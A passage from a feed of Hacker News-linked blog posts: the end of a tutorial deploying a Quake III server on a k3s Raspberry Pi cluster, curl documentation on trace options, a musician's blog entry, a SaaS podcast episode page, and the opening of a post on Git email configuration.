<div><pre><code data-lang="bash">$ export KUBECONFIG<span>=</span><span>$(</span>pwd<span>)</span>/kubeconfig</code></pre></div>
<p>Next, install the inlets-operator with <code>arkade</code>:</p>
<div><pre><code data-lang="bash">$ arkade install inlets-operator --provider digitalocean --token-file ~/do-api-token</code></pre></div>
<p>The inlets-operator will create an inlets exit-node on DigitalOcean, giving the LoadBalancer services in the private k3s cluster a public IP address.</p>

<p>As clients connect to the server via QuakeJS in the browser with websockets, the OSS version of inlets will do just fine. If you want to have better support for TLS etc, I can highly recommend having a look at inlets PRO version.</p>

<p>Finally, take the example yaml file from the QuakeKube GitHub repository and make the appropriate changes. The service should be updated to a LoadBalancer instead of type NodePort, and of course you can change the configuration to tweak the game preferences to your own needs.</p>

<p>Example of a QuakeKube yaml file:</p>
<div><pre><code data-lang="yaml">apiVersion: apps/v1
kind: Deployment
metadata:
  name: quakejs
spec:
  selector:
    matchLabels:
      run: quakejs
  replicas: <span>1</span>
  template:
    metadata:
      labels:
        run: quakejs
      annotations:
        prometheus.io/scrape: <span>'true'</span>
        prometheus.io/port: <span>'8080'</span>
    spec:
      containers:
      - command:
        - q3
        - server
        - --config=/config/config.yaml
        - --content-server=http://localhost:<span>9090</span>
        - --agree-eula
        image: docker.io/criticalstack/quake:v1.<span>0.5</span>
        name: server
        ports:
        - containerPort: <span>8080</span>
        readinessProbe:
          tcpSocket:
            port: <span>8080</span>
          initialDelaySeconds: <span>15</span>
          periodSeconds: <span>5</span>
        volumeMounts:
        - name: quake3-server-config
          mountPath: /config
        - name: quake3-content
          mountPath: /assets
      - command:
        - q3
        - content
        - --seed-content-url=http://content.quakejs.com
        image: docker.io/criticalstack/quake:v1.<span>0.5</span>
        name: content-server
        ports:
        - containerPort: <span>9090</span>
        volumeMounts:
        - name: quake3-content
          mountPath: /assets
      volumes:
        - name: quake3-server-config
          configMap:
            name: quake3-server-config
        - name: quake3-content
          emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: quakejs
spec:
  type: LoadBalancer
  selector:
    run: quakejs
  ports:
    - port: <span>80</span>
      targetPort: <span>8080</span>
      name: http
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: quake3-server-config
data:
  config.yaml: <span>|
</span><span>    fragLimit: 25</span>
    timeLimit: 15m
    bot:
      minPlayers: <span>3</span>
    game:
      motd: <span>"Welcome to Critical Stack"</span>
      type: FreeForAll
      forceRespawn: <span>false</span>
      inactivity: 10m
      quadFactor: <span>3</span>
      weaponRespawn: <span>3</span>
    server:
      hostname: <span>"quakekube"</span>
      maxClients: <span>12</span>
      password: <span>"changeme"</span>
    commands:
      - addbot sarge <span>2</span>
    maps:
    - name: q3dm7
      type: FreeForAll
      timeLimit: 10m
    - name: q3dm17
      type: FreeForAll
    - name: q3wctf1
      type: CaptureTheFlag
      captureLimit: <span>8</span>
    - name: q3tourney2
      type: Tournament
    - name: q3wctf3
      type: CaptureTheFlag
      captureLimit: <span>8</span>
    - name: ztn3tourney1
      type: Tournament</code></pre></div>
<p>Apply the yaml manifest to your k3s cluster:</p>
<div><pre><code data-lang="bash">$ kubectl apply -f example.yaml 
deployment.apps/quakejs created
service/quakejs created
configmap/quake3-server-config created</code></pre></div>
<p>Wait until all pods are running, and until the inlets-operator created the exit-node:</p>
<div><pre><code data-lang="bash">$ kubectl get pods,service
NAME                                         READY   STATUS    RESTARTS   AGE
pod/inlets-operator-76fb794578-s2fg4         <span>1</span>/1     Running   <span>0</span>          147m
pod/quakejs-tunnel-client-6f7c986dfc-mdt5w   <span>1</span>/1     Running   <span>0</span>          50s
pod/quakejs-786cc496b-g7b7n                  <span>2</span>/2     Running   <span>0</span>          80s

NAME                 TYPE           CLUSTER-IP    EXTERNAL-IP                       PORT<span>(</span>S<span>)</span>        AGE
service/kubernetes   ClusterIP      <span>10</span>.43.0.1     &lt;none&gt;                            <span>443</span>/TCP        152m
service/quakejs      LoadBalancer   <span>10</span>.43.46.33   <span>143</span>.110.174.204,143.110.174.204   <span>80</span>:32116/TCP   80s</code></pre></div>
<p>And that’s it! Open up your favourite browser, load the application and start fraggin’!</p>

<figure>
    <img src="https://johansiebens.dev/uploads/2020-11-22/quakejs.png"> 
</figure>




<hr>

<p><strong>References:</strong></p>

<ul>
<li><a href="https://github.com/criticalstack/quake-kube" target="_blank">https://github.com/criticalstack/quake-kube</a><br></li>
<li><a href="https://github.com/inlets/inlets-operator" target="_blank">https://github.com/inlets/inlets-operator</a><br></li>
<li><a href="https://github.com/alexellis/k3sup" target="_blank">https://github.com/alexellis/k3sup</a><br></li>
<li><a href="https://github.com/alexellis/arkade" target="_blank">https://github.com/alexellis/arkade</a><br></li>
</ul>

      </div></div>]]>
            </description>
            <link>https://johansiebens.dev/posts/2020/11/quake-iii-arena-k3s-and-a-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197850</guid>
            <pubDate>Tue, 24 Nov 2020 12:34:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything Curl – Trace Options]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197836">thread link</a>) | @kristianpaul
<br/>
November 24, 2020 | https://ec.haxx.se/usingcurl/usingcurl-verbose/usingcurl-trace | <a href="https://web.archive.org/web/*/https://ec.haxx.se/usingcurl/usingcurl-verbose/usingcurl-trace">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div data-editioncontainer="true"><div data-slate-editor="true" data-key="a6ef002b560e4352b590a3456afb72f4" autocorrect="on" spellcheck="true" data-gramm="false"><p data-key="19ab964dd5104d0e96746d1e9325ab76"><span><span data-key="c47a63eb63b94ec497e15ed367a3313b"><span data-offset-key="c47a63eb63b94ec497e15ed367a3313b:0">There are times when </span><span data-offset-key="c47a63eb63b94ec497e15ed367a3313b:1"><code spellcheck="false" data-slate-leaf="true">-v</code></span><span data-offset-key="c47a63eb63b94ec497e15ed367a3313b:2"> is not enough. In particular, when you want to store the complete stream including the actual transferred data.</span></span></span></p><p data-key="ebacf752bc4a4890967ec23222938013"><span><span data-key="79f7332dd6bf466aacd76677ded40423"><span data-offset-key="79f7332dd6bf466aacd76677ded40423:0">For situations when curl does encrypted file transfers with protocols such as HTTPS, FTPS or SFTP, other network monitoring tools (like Wireshark or tcpdump) will not be able to do this job as easily for you.</span></span></span></p><p data-key="58ba64ab45d8412da695e15d71709c8a"><span><span data-key="388656d103e64ea080c159503ff14673"><span data-offset-key="388656d103e64ea080c159503ff14673:0">For this, curl offers two other options that you use instead of </span><span data-offset-key="388656d103e64ea080c159503ff14673:1"><code spellcheck="false" data-slate-leaf="true">-v</code></span><span data-offset-key="388656d103e64ea080c159503ff14673:2">.</span></span></span></p><p data-key="da7a8717ac1c470eae69cbe4790ce6ce"><span><span data-key="971b082de53d4f43b1fbd479951ad5dd"><span data-offset-key="971b082de53d4f43b1fbd479951ad5dd:0"><code spellcheck="false" data-slate-leaf="true">--trace [filename]</code></span><span data-offset-key="971b082de53d4f43b1fbd479951ad5dd:1"> will save a full trace in the given file name. You can also use '-' (a single minus) instead of a file name to get it passed to stdout. You would use it like this:</span></span></span></p><div><pre data-key="4cbf6e9356b64ff484fb8d13de5929bc" spellcheck="false"><p><span data-key="b9ee5fdba4e84b738b41fa1c7f15fff2"><span data-offset-key="b9ee5fdba4e84b738b41fa1c7f15fff2:0">$ curl --trace dump http://example.com</span></span></p></pre></div><p data-key="405e863d115f431dadbf90deed491cf9"><span><span data-key="005bd2da5cdc4f1485025d85c8f20bf3"><span data-offset-key="005bd2da5cdc4f1485025d85c8f20bf3:0">When completed, there's a 'dump' file that can turn out pretty sizable. In this case, the 15 first lines of the dump file looks like:</span></span></span></p><div><pre data-key="0e0c49cd57b2442fac8b95477d19da3f" spellcheck="false"><p><span data-key="44ae1b41de7f46f991bf292597d73863"><span data-offset-key="44ae1b41de7f46f991bf292597d73863:0">== Info: Rebuilt URL to: http://example.com/</span></span></p><p><span data-key="6fed896d67624b529a0fdd3edf7203d2"><span data-offset-key="6fed896d67624b529a0fdd3edf7203d2:0">== Info:   Trying 93.184.216.34...</span></span></p><p><span data-key="4404aae5e0284eca86045739a019584a"><span data-offset-key="4404aae5e0284eca86045739a019584a:0">== Info: Connected to example.com (93.184.216.34) port 80 (#0)</span></span></p><p><span data-key="a91c13b6fb19420899f0ba554ad791c0"><span data-offset-key="a91c13b6fb19420899f0ba554ad791c0:0">=&gt; Send header, 75 bytes (0x4b)</span></span></p><p><span data-key="c6f46dbe7f4f488f92bb4a297ef5052a"><span data-offset-key="c6f46dbe7f4f488f92bb4a297ef5052a:0">0000: 47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a GET / HTTP/1.1..</span></span></p><p><span data-key="3c91a889a2fe43a0a667319325baa522"><span data-offset-key="3c91a889a2fe43a0a667319325baa522:0">0010: 48 6f 73 74 3a 20 65 78 61 6d 70 6c 65 2e 63 6f Host: example.co</span></span></p><p><span data-key="2e97d4ff01da467d85992911f65474a3"><span data-offset-key="2e97d4ff01da467d85992911f65474a3:0">0020: 6d 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 63 m..User-Agent: c</span></span></p><p><span data-key="5ef52f20d4114d228d1bf5d3c67708a1"><span data-offset-key="5ef52f20d4114d228d1bf5d3c67708a1:0">0030: 75 72 6c 2f 37 2e 34 35 2e 30 0d 0a 41 63 63 65 url/7.45.0..Acce</span></span></p><p><span data-key="3984e066f33645678f4330fce9d9658b"><span data-offset-key="3984e066f33645678f4330fce9d9658b:0">0040: 70 74 3a 20 2a 2f 2a 0d 0a 0d 0a                pt: */*....</span></span></p><p><span data-key="393ecd26a68e4a88998c7e654e2b8fdb"><span data-offset-key="393ecd26a68e4a88998c7e654e2b8fdb:0">&lt;= Recv header, 17 bytes (0x11)</span></span></p><p><span data-key="8b97f7554ac14ffa92725f4d1ce50791"><span data-offset-key="8b97f7554ac14ffa92725f4d1ce50791:0">0000: 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d HTTP/1.1 200 OK.</span></span></p><p><span data-key="48514fc4c23648779fcbd53d72ae53df"><span data-offset-key="48514fc4c23648779fcbd53d72ae53df:0">0010: 0a                                              .</span></span></p><p><span data-key="7118cb05b71540edbdd422769bb1d41c"><span data-offset-key="7118cb05b71540edbdd422769bb1d41c:0">&lt;= Recv header, 22 bytes (0x16)</span></span></p><p><span data-key="eedfedbbe314499f904e81cad9e260c6"><span data-offset-key="eedfedbbe314499f904e81cad9e260c6:0">0000: 41 63 63 65 70 74 2d 52 61 6e 67 65 73 3a 20 62 Accept-Ranges: b</span></span></p><p><span data-key="7a13f50dcfd74da5aff6f4598e00f943"><span data-offset-key="7a13f50dcfd74da5aff6f4598e00f943:0">0010: 79 74 65 73 0d 0a                               ytes..</span></span></p></pre></div><p data-key="e1381af0207e449a94931cb2b99773da"><span><span data-key="40a899c38f7b4a98a7387c1526a19730"><span data-offset-key="40a899c38f7b4a98a7387c1526a19730:0">Every single sent and received byte get displayed individually in hexadecimal numbers.</span></span></span></p><p data-key="3be1a1fe222a45b39a27341b6371848c"><span><span data-key="aa4dc13ee63040aab0c0303f6f7e5650"><span data-offset-key="aa4dc13ee63040aab0c0303f6f7e5650:0">If you think the hexadecimals are not helping, you can try </span><span data-offset-key="aa4dc13ee63040aab0c0303f6f7e5650:1"><code spellcheck="false" data-slate-leaf="true">--trace-ascii [filename]</code></span><span data-offset-key="aa4dc13ee63040aab0c0303f6f7e5650:2"> instead, also this accepting '-' for stdout and that makes the 15 first lines of tracing look like:</span></span></span></p><div><pre data-key="22868136a84e4e15810fefe740495ec8" spellcheck="false"><p><span data-key="9e299d2991d6426ba442339ee9e9f139"><span data-offset-key="9e299d2991d6426ba442339ee9e9f139:0">== Info: Rebuilt URL to: http://example.com/</span></span></p><p><span data-key="80b9bc8a91c2435bb40fba6cb5dfa9ff"><span data-offset-key="80b9bc8a91c2435bb40fba6cb5dfa9ff:0">== Info:   Trying 93.184.216.34...</span></span></p><p><span data-key="149c766c24ed40f386d75b401156ae33"><span data-offset-key="149c766c24ed40f386d75b401156ae33:0">== Info: Connected to example.com (93.184.216.34) port 80 (#0)</span></span></p><p><span data-key="2eb4b3433be241cf9d8eb7187f2f7e0b"><span data-offset-key="2eb4b3433be241cf9d8eb7187f2f7e0b:0">=&gt; Send header, 75 bytes (0x4b)</span></span></p><p><span data-key="19e16419fc4a4a18967d864bd04c66c0"><span data-offset-key="19e16419fc4a4a18967d864bd04c66c0:0">0000: GET / HTTP/1.1</span></span></p><p><span data-key="e1bda71508224e9fb07f75c1910e48ab"><span data-offset-key="e1bda71508224e9fb07f75c1910e48ab:0">0010: Host: example.com</span></span></p><p><span data-key="b2b1088640fd4ae5ab0cc1b6ca6483be"><span data-offset-key="b2b1088640fd4ae5ab0cc1b6ca6483be:0">0023: User-Agent: curl/7.45.0</span></span></p><p><span data-key="d6d0ce807724460789e6ebb6f6e892ec"><span data-offset-key="d6d0ce807724460789e6ebb6f6e892ec:0">003c: Accept: */*</span></span></p><p><span data-key="a78aa7be8d554fa6a96f7c9d6ffbfa23"><span data-offset-key="a78aa7be8d554fa6a96f7c9d6ffbfa23:0">0049:</span></span></p><p><span data-key="39c0feb1902f44e1a5510b833f89f811"><span data-offset-key="39c0feb1902f44e1a5510b833f89f811:0">&lt;= Recv header, 17 bytes (0x11)</span></span></p><p><span data-key="872de778b8e54a4ca78408bb59ad8477"><span data-offset-key="872de778b8e54a4ca78408bb59ad8477:0">0000: HTTP/1.1 200 OK</span></span></p><p><span data-key="7219088e0db041a686b8de990b9ce04c"><span data-offset-key="7219088e0db041a686b8de990b9ce04c:0">&lt;= Recv header, 22 bytes (0x16)</span></span></p><p><span data-key="fb7b2cac706844fabd0b49ed2853a9b4"><span data-offset-key="fb7b2cac706844fabd0b49ed2853a9b4:0">0000: Accept-Ranges: bytes</span></span></p><p><span data-key="73d1394550f4418c8c83309c8fe64c6c"><span data-offset-key="73d1394550f4418c8c83309c8fe64c6c:0">&lt;= Recv header, 31 bytes (0x1f)</span></span></p><p><span data-key="f69380f0d894401199a175232fb1082d"><span data-offset-key="f69380f0d894401199a175232fb1082d:0">0000: Cache-Control: max-age=604800</span></span></p></pre></div><p data-key="21a030a4b3934ff086e961b01bacf8c5"><span><span data-key="45a9708d34fa4752b596d88b6c328371"><span data-offset-key="45a9708d34fa4752b596d88b6c328371:0">This options prefixes all verbose/trace outputs with a high resolution timer for when the line is printed. It works with the regular </span><span data-offset-key="45a9708d34fa4752b596d88b6c328371:1"><code spellcheck="false" data-slate-leaf="true">-v / --verbose</code></span><span data-offset-key="45a9708d34fa4752b596d88b6c328371:2"> option as well as with </span><span data-offset-key="45a9708d34fa4752b596d88b6c328371:3"><code spellcheck="false" data-slate-leaf="true">--trace</code></span><span data-offset-key="45a9708d34fa4752b596d88b6c328371:4"> and </span><span data-offset-key="45a9708d34fa4752b596d88b6c328371:5"><code spellcheck="false" data-slate-leaf="true">--trace-ascii</code></span><span data-offset-key="45a9708d34fa4752b596d88b6c328371:6">.</span></span></span></p><p data-key="7dbd3d9e6be64569ae4ebfea8bdc44bf"><span><span data-key="d1a95ff5f69a4df297db6d12ca769d30"><span data-offset-key="d1a95ff5f69a4df297db6d12ca769d30:0">An example could look like this:</span></span></span></p><div><pre data-key="f3da03e1fe2f4e2dac6c9f1e40521e40" spellcheck="false"><p><span data-key="cacf73c781794099a94f5b902e53b860"><span data-offset-key="cacf73c781794099a94f5b902e53b860:0">$ curl -v --trace-time http://example.com</span></span></p><p><span data-key="1276cd54ea564f18b7a06b52900c17c6"><span data-offset-key="1276cd54ea564f18b7a06b52900c17c6:0">23:38:56.837164 * Rebuilt URL to: http://example.com/</span></span></p><p><span data-key="b13c21a8314e458baeee201b73f970e2"><span data-offset-key="b13c21a8314e458baeee201b73f970e2:0">23:38:56.841456 *   Trying 93.184.216.34...</span></span></p><p><span data-key="5ef410ea4c8a4361bf582f6d3a529375"><span data-offset-key="5ef410ea4c8a4361bf582f6d3a529375:0">23:38:56.935155 * Connected to example.com (93.184.216.34) port 80 (#0)</span></span></p><p><span data-key="0217c735977049c1a784a28bf069dfce"><span data-offset-key="0217c735977049c1a784a28bf069dfce:0">23:38:56.935296 &gt; GET / HTTP/1.1</span></span></p><p><span data-key="3e04d627753b4d09a993df6cffa6957f"><span data-offset-key="3e04d627753b4d09a993df6cffa6957f:0">23:38:56.935296 &gt; Host: example.com</span></span></p><p><span data-key="4bcff79e2b814cce8580b3e7b6bdd83b"><span data-offset-key="4bcff79e2b814cce8580b3e7b6bdd83b:0">23:38:56.935296 &gt; User-Agent: curl/7.45.0</span></span></p><p><span data-key="a36dc28f81b44594bb976f8fcccf8f88"><span data-offset-key="a36dc28f81b44594bb976f8fcccf8f88:0">23:38:56.935296 &gt; Accept: */*</span></span></p><p><span data-key="fe46ebea85294730aa0343db560b267e"><span data-offset-key="fe46ebea85294730aa0343db560b267e:0">23:38:56.935296 &gt;</span></span></p><p><span data-key="84569ebfbf29412baf4978628e7be2ce"><span data-offset-key="84569ebfbf29412baf4978628e7be2ce:0">23:38:57.029570 &lt; HTTP/1.1 200 OK</span></span></p><p><span data-key="4fea7818e129445397f0d80923b92786"><span data-offset-key="4fea7818e129445397f0d80923b92786:0">23:38:57.029699 &lt; Accept-Ranges: bytes</span></span></p><p><span data-key="924e7f8c5f434d6288a907642f83342b"><span data-offset-key="924e7f8c5f434d6288a907642f83342b:0">23:38:57.029803 &lt; Cache-Control: max-age=604800</span></span></p><p><span data-key="c05e4aa2dae740dc955924488c78a2f0"><span data-offset-key="c05e4aa2dae740dc955924488c78a2f0:0">23:38:57.029903 &lt; Content-Type: text/html</span></span></p><p><span data-key="479f1288467c414a92097deb991b5fa5"><span data-offset-key="479f1288467c414a92097deb991b5fa5:0">---- snip ----</span></span></p></pre></div><p data-key="6fa17657da7c4b9fb344c095331193e5"><span><span data-key="4c19bbee96c14e618d2e5b80ae437f5b"><span data-offset-key="4c19bbee96c14e618d2e5b80ae437f5b:0">The lines are all the local time as hours:minutes:seconds and then number of microseconds in that second.</span></span></span></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://ec.haxx.se/usingcurl/usingcurl-verbose/usingcurl-trace</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197836</guid>
            <pubDate>Tue, 24 Nov 2020 12:31:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[School Supplies, Loop Pedals, and Tips for Zoom Open-Mic Nights]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197814">thread link</a>) | @whatrocks
<br/>
November 24, 2020 | https://www.charlieharrington.com/school-supplies | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/school-supplies">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>2020-11-16</h3><div><p>Somedays I remember that I have a <a href="https://amzn.to/2H8SH8O">loop pedal</a>.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/669cd/loop.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="loop pedal" title="loop pedal" src="https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/a6d36/loop.png" srcset="https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/222b7/loop.png 163w,
https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/ff46a/loop.png 325w,
https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/a6d36/loop.png 650w,
https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/e548f/loop.png 975w,
https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/3c492/loop.png 1300w,
https://www.charlieharrington.com/static/b6492df4a2d5144202ebc69c5d29b21b/669cd/loop.png 3024w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>Those are the best sorts of days.</p>
<p>Somedays that leads to a new song.</p>
<h3>School Supplies</h3>
<p>Hello, world, this is your premiere of SCHOOL SUPPLIES, the third single off my forthcoming EP: "Greetings From Buttzville, NJ":</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/o57rqh88CJY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<p>The chords, for those interested (looking at you, The Grones) are:</p>
<div data-language="text"><pre><code>Verse
G Bm Em C

Chorus
D G C

Outro(key change!)
A C#m F#m D</code></pre></div>
<p>That's right! I pulled off my first key change. Thank you, Taylor Swift "Love Song" for the daily inspiration.</p>
<p>I'll leave the lyrics as an exercise for the reader.</p>
<h4>Uncle Mike's Tips for Running a Zoom-Based Open Mic Night</h4>
<p>Big thanks to Uncle Mike for organizing our second Zoom family open mic night. He runs a tight ship, mostly trying to prevent me from launching into a <a href="https://www.charlieharrington.com/bullet-train-to-merlins-grave">Bullet Train to Merlin's Grave medley like at Popestock</a>.</p>
<p>To paraphrase his tips:</p>
<ul>
<li>Each performer gets one song, of "normal song length" (so that means no Tubular Bells)</li>
<li>Announce the order in advance</li>
<li>Tune up your instrument when you're on deck or in the hole</li>
<li>Don't worry about messing up, start over if you need to, this is fun. Music is the best!</li>
<li>Change your zoom settings to "Original Sound"</li>
</ul>
<p>This last one is key. Zoom does some "stuff" to make things sound "good" during boring work meetings that are boring. It's not optimized for fun singalongs that are fun. So, it's pretty much essential to <a href="https://support.zoom.us/hc/en-us/articles/115003279466-Enabling-option-to-preserve-original-sound">follow these steps</a> when you're singing and strumming over Zoom, unless you're trying to incorporate cosmic waves of hollow nothingness into your jam. Maybe you are?</p>
<p>Oh, you should check out Uncle Mike's music podcast, <a href="https://www.tellyouwhatpodcast.com/">Tell You What! The Podcast</a>. He interviews young musicians and bands on the run and it's fun and great and keeps you on your toes with new upcoming artists.</p>
<p>As Uncle Mike says, music is the best!</p></div><div><p>The almost-never newsletter. I won't spam you, and you can unsubscribe anytime.</p></div></div></div></div>]]>
            </description>
            <link>https://www.charlieharrington.com/school-supplies</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197814</guid>
            <pubDate>Tue, 24 Nov 2020 12:28:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Live SaaS growth feedback with Sujan Patel]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197772">thread link</a>) | @tomhuntio
<br/>
November 24, 2020 | https://saasmarketer.io/ep-015-sujan-patel-shares-4-saas-growth-strategies-for-bcast/ | <a href="https://web.archive.org/web/*/https://saasmarketer.io/ep-015-sujan-patel-shares-4-saas-growth-strategies-for-bcast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  <div>
                  	<div>
		
<article id="post-1946">
	<!-- .entry-header -->

	
	
		<p><img width="1200" height="628" src="https://saasmarketer.io/wp-content/uploads/2020/11/Sujan-Patel-SaaS-Marketer-FB-Thumbnail.jpg" alt="" loading="lazy" srcset="https://saasmarketer.io/wp-content/uploads/2020/11/Sujan-Patel-SaaS-Marketer-FB-Thumbnail.jpg 1200w, https://saasmarketer.io/wp-content/uploads/2020/11/Sujan-Patel-SaaS-Marketer-FB-Thumbnail-300x157.jpg 300w, https://saasmarketer.io/wp-content/uploads/2020/11/Sujan-Patel-SaaS-Marketer-FB-Thumbnail-1024x536.jpg 1024w, https://saasmarketer.io/wp-content/uploads/2020/11/Sujan-Patel-SaaS-Marketer-FB-Thumbnail-768x402.jpg 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px">	</p><!-- .post-thumbnail -->

		<p>
	Content, Partnerships</p>

	<div>
		
<p>Or listen on:</p>
<ul>
<li><a href="https://podcasts.apple.com/us/podcast/confessions-of-a-b2b-marketer/id1504044930" target="_blank" rel="noopener noreferrer">Apple Podcasts</a></li>
<li><a href="https://open.spotify.com/show/7Ko5WPGfuyueiphdlRGAES" target="_blank" rel="noopener noreferrer">Spotify</a></li>
<li><a href="https://podcasts.google.com/feed/aHR0cHM6Ly9mZWVkcy5iY2FzdC5mbS9jb25mZXNzaW9ucy1vZi1hLWIyYi1tYXJrZXRlcg" target="_blank" rel="noopener noreferrer">Google Podcasts</a></li>
</ul>
<hr>
<p>After our <a href="https://saasmarketer.io/ep-014-300k-sessions-per-month-with-sujan-patel-of-mailshake/" target="_blank" rel="noopener noreferrer">previous episode</a>, Sujan causally mentioned that he would love to talk further about growing bCast…</p>
<p>I jumped at the chance and asked Sujan if he would be happy to record them: he was.</p>
<p>We didn’t speak about it again until we jumped on another call to record… I think Sujan did approx. 5 minutes of research before. He then proceeded to brain dump 4 MASSIVE growth strategies for bCast:</p>
<ul>
<li><span> Focus on features that help existing customers GROW</span></li>
<li><span> 10x SEO volume</span></li>
<li><span> Pure backlink hustle</span></li>
<li><span> Get to know the influences</span></li>
</ul>
<p>We could have gone on for another 30 minutes, but we only had 30 minutes to record.</p>
<p>Each of these have been put into practice since we recorded approx. a week ago and I will update you with how we do right here on this blog. We may even bring Sujan back on in 6-12 months to debrief on progress.</p>
<p>Check out:</p>
<ul>
<li><a href="https://sujanpatel.com/" target="_blank" rel="noopener noreferrer">Sujan’s blog</a></li>
<li><a href="https://twitter.com/sujanpatel" target="_blank" rel="noopener noreferrer">Sujan’s Twitter</a></li>
<li><a href="https://mailshake.com/" target="_blank" rel="noopener noreferrer">Mailshake</a></li>
</ul>
<p>Also… thanks for reading/listening and of course… if you jump over to <a href="https://podcasts.apple.com/us/podcast/confessions-of-a-b2b-marketer/id1504044930" target="_blank" rel="noopener noreferrer">Apple</a> and leave a review… always, if you can leave a review I will get you and your business a shout out on the show!</p>
<hr>
<p>This episode is brought to you by <a href="https://ahrefs.com/webmaster-tools?utm_source=email&amp;utm_medium=newsletter&amp;utm_content=saas_marketer" target="_blank" rel="noopener noreferrer">Ahrefs super, freaking, awesome, free Webmaster Tools</a>.</p>
<p>You can:</p>
<ul>
<li>Monitor the health of your site</li>
<li>Check for backlinks</li>
<li>See which keywords are working for you</li>
</ul>
<p>By simply signing up <a href="https://ahrefs.com/webmaster-tools?utm_source=email&amp;utm_medium=newsletter&amp;utm_content=saas_marketer" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>(+9026 people signed up in the past 7 days!)</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img alt="" src="https://secure.gravatar.com/avatar/a4824982d9a3d3b7f192b17948b4a36f?s=100&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/a4824982d9a3d3b7f192b17948b4a36f?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" itemprop="image" loading="lazy"></p><div><p>Tom Hunt is the founder of SaaS Marketer and bCast (B2B podcast hosting for high growth businesses). He lives and works in Hackney, London with his delightful partner Rebecca and little dog called Bear.</p></div></div>	</div><!-- .entry-content -->

	<!--<footer class="entry-footer">
		<span class="byline"><span class="author vcard"><img alt='' src='https://secure.gravatar.com/avatar/a4824982d9a3d3b7f192b17948b4a36f?s=49&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a4824982d9a3d3b7f192b17948b4a36f?s=98&#038;d=mm&#038;r=g 2x' class='avatar avatar-49 photo' height='49' width='49' loading='lazy'/><span class="screen-reader-text">Author </span> <a class="url fn n" href="https://saasmarketer.io/administrator/tom-hunt/">Tom Hunt</a></span></span><span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="https://saasmarketer.io/ep-015-sujan-patel-shares-4-saas-growth-strategies-for-bcast/" rel="bookmark"><time class="entry-date published" datetime="2020-11-24T11:46:21+00:00">11/24/2020</time><time class="updated" datetime="2020-11-24T11:57:32+00:00">11/24/2020</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="https://saasmarketer.io/category/content/" rel="category tag">Content</a>, <a href="https://saasmarketer.io/category/partnerships/" rel="category tag">Partnerships</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="https://saasmarketer.io/tag/listen/" rel="tag">Listen</a></span>			</footer>-->

	<!-- .entry-footer -->
</article><!-- #post-1946 -->


	</div>
    

</div>
</div></div>]]>
            </description>
            <link>https://saasmarketer.io/ep-015-sujan-patel-shares-4-saas-growth-strategies-for-bcast/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197772</guid>
            <pubDate>Tue, 24 Nov 2020 12:22:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Configuring Git for Work]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197762">thread link</a>) | @fphilipe
<br/>
November 24, 2020 | https://phili.pe/posts/configuring-git-for-work/ | <a href="https://web.archive.org/web/*/https://phili.pe/posts/configuring-git-for-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><article>
  <header>
    
    <p>
      November 17, 2020
    </p>
  </header><p>You can override your globally configured email inside individual repositories, allowing you to use your work email for work-related repos. Setting this up for each repo—and remembering to do so—is cumbersome. Luckily, there is an easier way to accomplish this for all repos within a certain directory.</p>

<p>One of the first things you did when you set up Git was to configure your name and email:</p>

<pre><code>$ git config --global user.name "Jane Doe"
$ git config --global user.email jane@mail.com
</code></pre>

<p>The above commands added the following lines to your global Git configuration file <code>~/.gitconfig</code>:</p>

<pre><code><span>[user]</span>
	<span>name</span> <span>=</span> <span>Jane Doe</span>
	<span>email</span> <span>=</span> <span>jane@mail.com</span>
</code></pre>

